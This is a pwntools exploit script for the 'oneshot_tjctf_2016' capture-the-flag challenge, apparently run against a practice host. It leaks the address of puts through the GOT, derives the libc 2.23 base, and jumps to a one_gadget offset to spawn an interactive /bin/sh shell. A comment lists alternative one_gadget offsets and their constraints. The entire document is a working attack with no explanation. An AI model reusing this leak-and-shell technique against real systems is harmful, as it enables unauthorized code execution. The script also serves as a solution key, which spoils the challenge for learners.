#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./oneshot_tjctf_2016')
	elf = ELF('./oneshot_tjctf_2016',checksec=False)
	libc = ELF('./libc-2.23.so')

else:
	p = remote('node3.buuoj.cn',26842)
	elf = ELF('./oneshot_tjctf_2016',checksec=False)
	libc = ELF('./libc-2.23.so')


puts_got = elf.got['puts']
sla("Read location?",str(puts_got))
ru("Value: ")
puts = int(rv(18),16)

libc_base = puts - libc.symbols['puts']
success(hex(libc_base))
one_gadget = libc_base + 0x45216

sla("Jump location?",str(one_gadget))

ia()

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''